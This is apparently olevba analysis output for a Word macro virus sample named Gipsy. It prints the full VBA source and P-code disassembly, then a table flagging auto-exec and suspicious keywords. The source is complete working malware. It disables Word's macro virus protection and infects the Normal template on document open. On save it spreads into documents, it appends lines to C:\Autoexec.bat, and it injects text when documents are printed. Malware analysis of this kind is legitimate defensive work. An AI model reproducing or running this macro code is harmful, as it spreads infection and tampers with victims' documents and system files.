olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gipsy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gipsy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GIPSY.bas 
in file: ./Virus.MSWord.Gipsy - OLE stream: 'Macros/VBA/GIPSY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    NormalTemplate.VBProject.VBComponents(i).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Do
    Line Input #1, NormInstalled
    Loop Until Left(NormInstalled, 3) = "Sub" Or Left(NormInstalled, 7) = "VERSION"
    Line Input #1, NormInstalled
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
        Close #1
        Kill "C:\Gen.dat"
        Call Payload
    GoTo ErrorAO
    End If
    Close #1
Next i

For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    ActiveDocument.VBProject.VBComponents(x).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Do
    Line Input #1, NormInstalled
    Loop Until Left(NormInstalled, 3) = "Sub" Or Left(NormInstalled, 7) = "VERSION"
    Line Input #1, NormInstalled
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
        Close #1
        Kill "C:\Gen.dat"
        GoTo InfectionStart
    End If
    Close #1
Next x
InfectionStart:
Randomize (Int(Timer * Timer / Int(Rnd * Timer)))
NormInstalled = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
DocInstalled = ActiveDocument.VBProject.VBComponents(x).Name
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=DocInstalled, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=DocInstalled, NewName:=NormInstalled, Object:=wdOrganizerObjectProjectItems
ErrorAO:
End Sub
Sub Payload()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
i = Int(Rnd * 10)
Select Case i
Case Is <= 3
With Assistant.NewBalloon
    .Heading = "The Gipsy Virus:"
    .Text = "Copy me, I like to travel"
    .Show
End With
Case Is >= 4
Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo off"
For x = 1 To 20
Print #1, "echo Help me I'm sick >>C:\Computer." & "V" & Chr(255) & Chr(219)
Next x
Close #1
End Select
If Left(Date, 5) = "24.12" Then
With Assistant.NewBalloon
    .Heading = "BiologicBeast Virus:"
    .Text = "Mary Christmas...     don't work at this day"
    .Show
End With
ThisDocument.Save
ThisDocument.Close
End If
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    NormalTemplate.VBProject.VBComponents(x).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Line Input #1, WhoAmI
    Line Input #1, WhoAmI
    Line Input #1, NormInstalled
    Line Input #1, NormReadOnly
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Sub AutoOpen()" And NormReadOnly = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
    Close #1
    Kill "C:\Gen.dat"
    GoTo InfectionStart
    End If
Close #1
Next x
InfectionStart:
Randomize (Int(Timer * Timer / Int(Rnd * Timer)))
DocInstalled = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
NormInstalled = NormalTemplate.VBProject.VBComponents(x).Name
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=NormInstalled, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=NormInstalled, NewName:=DocInstalled, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FilePrint()
On Error Resume Next
Selection.MoveEnd
Selection.Text = Chr(13) & "...help me, I'm sick"
Dialogs(wdDialogFilePrint).Show
Selection.Delete
End Sub
Sub ViewVBCode()
Call Payload
End Sub
Sub ToolsMacro()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Gipsy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/GIPSY - 8109 bytes
' Line #0:
' 	FuncDefn (Sub AuToOpEn())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #6:
' 	LitStr 0x000A "C:\Gen.dat"
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #7:
' 	LitStr 0x000A "C:\Gen.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #8:
' 	Do 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #10:
' 	Ld NormInstalled 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Eq 
' 	Ld NormInstalled 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "VERSION"
' 	Eq 
' 	Or 
' 	LoopUntil 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld DocInstalled 
' 	LineInput 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld DocThere 
' 	LineInput 
' Line #14:
' 	Ld NormInstalled 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Eq 
' 	Ld DocInstalled 
' 	LitStr 0x001D "WordBasic.DisableAutoMacros 0"
' 	Eq 
' 	And 
' 	Ld DocThere 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	LitStr 0x000A "C:\Gen.dat"
' 	ArgsCall Kill 0x0001 
' Line #17:
' 	ArgsCall (Call) Payload 0x0000 
' Line #18:
' 	GoTo ErrorAO 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' Line #23:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #24:
' 	LitStr 0x000A "C:\Gen.dat"
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #25:
' 	LitStr 0x000A "C:\Gen.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #26:
' 	Do 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #28:
' 	Ld NormInstalled 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Eq 
' 	Ld NormInstalled 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "VERSION"
' 	Eq 
' 	Or 
' 	LoopUntil 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld DocInstalled 
' 	LineInput 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld DocThere 
' 	LineInput 
' Line #32:
' 	Ld NormInstalled 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Eq 
' 	Ld DocInstalled 
' 	LitStr 0x001D "WordBasic.DisableAutoMacros 0"
' 	Eq 
' 	And 
' 	Ld DocThere 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #34:
' 	LitStr 0x000A "C:\Gen.dat"
' 	ArgsCall Kill 0x0001 
' Line #35:
' 	GoTo InfectionStart 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Label InfectionStart 
' Line #40:
' 	Ld Timer 
' 	Ld Timer 
' 	Mul 
' 	Ld Rnd 
' 	Ld Timer 
' 	Mul 
' 	FnInt 
' 	Div 
' 	FnInt 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #41:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NormInstalled 
' Line #42:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocInstalled 
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld DocInstalled 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocInstalled 
' 	ParamNamed New 
' 	Ld NormInstalled 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #45:
' 	Label ErrorAO 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub Payload())
' Line #48:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #49:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #52:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #53:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St i 
' Line #54:
' 	Ld i 
' 	SelectCase 
' Line #55:
' 	LitDI2 0x0003 
' 	CaseLe 
' 	CaseDone 
' Line #56:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #57:
' 	LitStr 0x0010 "The Gipsy Virus:"
' 	MemStWith Heading 
' Line #58:
' 	LitStr 0x0019 "Copy me, I like to travel"
' 	MemStWith Then 
' Line #59:
' 	ArgsMemCallWith Show 0x0000 
' Line #60:
' 	EndWith 
' Line #61:
' 	LitDI2 0x0004 
' 	CaseGe 
' 	CaseDone 
' Line #62:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #64:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "echo Help me I'm sick >>C:\Computer."
' 	LitStr 0x0001 "V"
' 	Concat 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #66:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #68:
' 	EndSelect 
' Line #69:
' 	Ld Date 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "24.12"
' 	Eq 
' 	IfBlock 
' Line #70:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #71:
' 	LitStr 0x0014 "BiologicBeast Virus:"
' 	MemStWith Heading 
' Line #72:
' 	LitStr 0x002C "Mary Christmas...     don't work at this day"
' 	MemStWith Then 
' Line #73:
' 	ArgsMemCallWith Show 0x0000 
' Line #74:
' 	EndWith 
' Line #75:
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' Line #76:
' 	Ld ThisDocument 
' 	ArgsMemCall Close 0x0000 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub fILESAVEAs())
' Line #80:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #81:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #82:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #84:
' 	Ld wdDialogfILESAVEAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #86:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #89:
' 	LitStr 0x000A "C:\Gen.dat"
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #90:
' 	LitStr 0x000A "C:\Gen.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #91:
' 	LitDI2 0x0001 
' 	Ld WhoAmI 
' 	LineInput 
' Line #92:
' 	LitDI2 0x0001 
' 	Ld WhoAmI 
' 	LineInput 
' Line #93:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #94:
' 	LitDI2 0x0001 
' 	Ld NormReadOnly 
' 	LineInput 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld DocInstalled 
' 	LineInput 
' Line #96:
' 	LitDI2 0x0001 
' 	Ld DocThere 
' 	LineInput 
' Line #97:
' 	Ld NormInstalled 
' 	LitStr 0x000E "Sub AuToOpEn()"
' 	Eq 
' 	Ld NormReadOnly 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Eq 
' 	And 
' 	Ld DocInstalled 
' 	LitStr 0x001D "WordBasic.DisableAutoMacros 0"
' 	Eq 
' 	And 
' 	Ld DocThere 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #99:
' 	LitStr 0x000A "C:\Gen.dat"
' 	ArgsCall Kill 0x0001 
' Line #100:
' 	GoTo InfectionStart 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #103:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #104:
' 	Label InfectionStart 
' Line #105:
' 	Ld Timer 
' 	Ld Timer 
' 	Mul 
' 	Ld Rnd 
' 	Ld Timer 
' 	Mul 
' 	FnInt 
' 	Div 
' 	FnInt 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #106:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St DocInstalled 
' Line #107:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NormInstalled 
' Line #108:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld NormInstalled 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #109:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormInstalled 
' 	ParamNamed New 
' 	Ld DocInstalled 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #110:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub FilePrint())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Ld Selection 
' 	ArgsMemCall MoveEnd 0x0000 
' Line #115:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0014 "...help me, I'm sick"
' 	Concat 
' 	Ld Selection 
' 	MemSt Then 
' Line #116:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #117:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub ViewVBCode())
' Line #120:
' 	ArgsCall (Call) Payload 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub ToolsMacro())
' Line #123:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

